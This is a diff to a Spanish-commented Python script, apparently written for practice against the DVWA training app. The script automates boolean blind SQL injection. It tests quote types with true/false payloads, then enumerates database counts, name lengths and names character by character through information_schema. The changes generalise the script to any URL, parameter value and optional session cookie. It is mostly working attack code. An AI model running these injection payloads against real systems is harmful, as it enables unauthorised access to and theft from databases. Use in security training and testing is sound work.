@@ -24,21 +24,25 @@ from bs4 import BeautifulSoup
 def init_variables():
 
     # Comprobamos el número de argumentos de la línea de comandos
-    if len(sys.argv) != 5:
-        print(f'\033[91m\n[ERROR] USAGE: $ python3 dvwa_sqli_blind_text.py <URL> <PARAMETER> <EXPECTED_TRUE_OUTPUT> <PHPSESSID>\033[0m\n')
+    if len(sys.argv) not in [5, 6]:
+        print(f'\033[91m\n[ERROR] USAGE: $ python3 dvwa_sqli_blind_text.py <URL> <PARAMETER> <PARAMETER_VALUE> <EXPECTED_TRUE_OUTPUT> [<PHPSESSID>]\033[0m\n')
         sys.exit(2)
     else:
-        base_url = sys.argv[1]
-        base_url += "?" + sys.argv[2] + "="
+        # Definimos la url base, parámetro GET, valor del parámetro y salida correcta esperada
+        base_url = str(sys.argv[1])
+        base_url += "?" + str(sys.argv[2]) + "="
         print(f'\n[INFO] La dirección URL base es: {base_url}')
-        expected_output = sys.argv[3]
+        parameter_value = str(sys.argv[3])
+        expected_true_output = str(sys.argv[4])
+        cookies = {}
 
         # Establecemos las cookies necesarias para realizar las peticiones
-        dvwa_security_level = "low"
-        phpsessid = sys.argv[4]
-        cookies = {'security': dvwa_security_level, 'PHPSESSID': phpsessid}
+        if len(sys.argv) == 6:
+            dvwa_security_level = "low"
+            phpsessid = str(sys.argv[5])
+            cookies = {'security': dvwa_security_level, 'PHPSESSID': phpsessid}
 
-    return base_url, cookies, expected_output
+    return base_url, cookies, parameter_value, expected_true_output
 
 
 ##################################################
@@ -54,8 +58,8 @@ def paso_0():
     # Comprobamos los diferentes tipos de vulnerabilidades SQL Injection
     for vuln_type in ["\'", "\"", ""]:
         print(f"[INFO] Comprobando vulnerabilidad Blind SQL Injection con: {vuln_type} ...")
-        url1 = base_url + f"1{vuln_type} and 1={vuln_type}1" + "&Submit=Submit#"
-        url2 = base_url + f"1{vuln_type} and 1={vuln_type}0" + "&Submit=Submit#"    
+        url1 = base_url + f"{parameter_value}{vuln_type} and 1={vuln_type}1" + "&Submit=Submit#"
+        url2 = base_url + f"{parameter_value}{vuln_type} and 1={vuln_type}0" + "&Submit=Submit#"    
         
         r1 = requests.get(url1, cookies=cookies)
         sleep(0.5)
@@ -63,7 +67,7 @@ def paso_0():
         sleep(0.5)
 
         # Si no captura bien el content-length de la petición, comentar esa condición del if
-        if((r1.headers.get('content-length') != r2.headers.get('content-length')) and (expected_output not in r2.text)):
+        if((r1.headers.get('content-length') != r2.headers.get('content-length')) and (expected_true_output not in r2.text)):
             blind_sqli_vuln_type = vuln_type
             print(f'\033[92m[SUCCESS] ¡¡Vulnerabilidad Blind SQL Injection con: {blind_sqli_vuln_type} !!\033[0m')
             break
@@ -87,7 +91,7 @@ def paso_1():
 
     for i in range(1, 100):
         # Formamos la url y realizamos la petición
-        url = base_url + "1" + blind_sqli_vuln_type + "and (select count(schema_name) from information_schema.schemata)=" \
+        url = base_url + parameter_value + blind_sqli_vuln_type + "and (select count(schema_name) from information_schema.schemata)=" \
             + str(i) + " -- -&Submit=Submit#"
         r = requests.get(url, cookies=cookies)
 
@@ -95,7 +99,7 @@ def paso_1():
         sleep(0.1)
 
         # Comprobamos si se detecta el usuario admin en el contenido de la respuesta
-        if expected_output in r.text:
+        if expected_true_output in r.text:
             total_databases = i
             # salimos del bucle si hemos encontrado el nº total de bases de datos correcto
             break;
@@ -123,7 +127,7 @@ def paso_2(total_databases):
         # Identificamos el tamaño de cada una de las bases de datos
         for j in range(1, 65):
             # Formamos la url
-            url = base_url + "1" + blind_sqli_vuln_type + " and (select length(schema_name) from information_schema.schemata limit " \
+            url = base_url + parameter_value + blind_sqli_vuln_type + " and (select length(schema_name) from information_schema.schemata limit " \
                 + str(i) + ",1)=" + str(j) + " -- -&Submit=Submit#"
             r = requests.get(url, cookies=cookies)
 
@@ -131,7 +135,7 @@ def paso_2(total_databases):
             sleep(0.1)
 
             # Comprobamos si se detecta el usuario admin en el contenido de la respuesta
-            if expected_output in r.text:
+            if expected_true_output in r.text:
                 total_characters_per_db.append(j)
                 # Imprimimos el tamaño de cada una de las bases de datos
                 print(f'\033[92m[SUCCESS] El nombre de la base de datos #{i} contiene {j} caracteres\033[0m')
@@ -167,7 +171,7 @@ def paso_3(total_databases, total_characters_per_db):
             chars_brute_force = string.ascii_lowercase + string.digits + '-_ ' + string.ascii_uppercase
             for char in (chars_brute_force):
                 # Formamos la url
-                url = base_url + "1" + blind_sqli_vuln_type + " and substring((select schema_name from information_schema.schemata limit " \
+                url = base_url + parameter_value + blind_sqli_vuln_type + " and substring((select schema_name from information_schema.schemata limit " \
                     + str(i) + ",1)," + str(j) + ",1)=\'" + str(char) + "\' -- -&Submit=Submit#"
                 r = requests.get(url, cookies=cookies)
                 
@@ -175,7 +179,7 @@ def paso_3(total_databases, total_characters_per_db):
                 sleep(0.1)
                 
                 # Comprobamos si se detecta el usuario admin en el contenido de la respuesta
-                if expected_output in r.text:
+                if expected_true_output in r.text:
                     i_db_name = i_db_name + str(char)
                     # salimos del bucle si hemos encontrado el carácter correcto
                     break;
@@ -213,13 +217,13 @@ def lanzar_consulta():
 # Menú del programa #
 #####################
 
-def menu(base_url, cookies, blind_sqli_vuln_type, expected_output):
+def menu(base_url, cookies, blind_sqli_vuln_type, expected_true_output):
     print(f'\n--------------------------------------------------------------------------------------------------------------')
     print(f"\nAcciones y funcionalidades disponibles:\n\n" \
             "\t[1] Calcular el nº total de bases de datos\n" \
             "\t[2] Calcular el nº de caracteres de cada una de las bases de datos\n" \
             "\t[3] Identificar carácter a carácter el nombre de cada una de las bases de datos\n" \
-            "\t[4] Lanzar petición personalizada (en desarrollo)\n" \
+            "\t[4] Lanzar petición personalizada (experimental, solo para DVWA)\n" \
             "\t[5] Salir del programa")
     
     menu_option = str(input(f'\nSelecciona la acción del menú [1-5] (intro para opción por defecto [3]): '))
@@ -237,7 +241,7 @@ def menu(base_url, cookies, blind_sqli_vuln_type, expected_output):
     elif(menu_option == "4"):
         lanzar_consulta()
     elif(menu_option == "5"):
-        print(f'\nSaliendo del programa...')
+        print(f'\n[INFO] Saliendo del programa...')
         sys.exit(2)
     else:
         print(f'La opción seleccionada [{menu_option}] no es válida. Por favor, marque una opción del [1-5]')
@@ -249,11 +253,11 @@ def menu(base_url, cookies, blind_sqli_vuln_type, expected_output):
 
 def main():
     while(1):
-        menu(base_url, cookies, blind_sqli_vuln_type, expected_output)
+        menu(base_url, cookies, blind_sqli_vuln_type, expected_true_output)
 
 if __name__ == "__main__":
-    # Inicializamos las variables de url_base, cookies y expected_output
-    base_url, cookies, expected_output = init_variables()
+    # Inicializamos las variables de url_base, cookies y expected_true_output
+    base_url, cookies, parameter_value, expected_true_output = init_variables()
     # Comprobamos si hay vulnerabilidad SQL Injection en la url_base
     blind_sqli_vuln_type = paso_0()
     # Llamamos a la función main para el menú de opciones
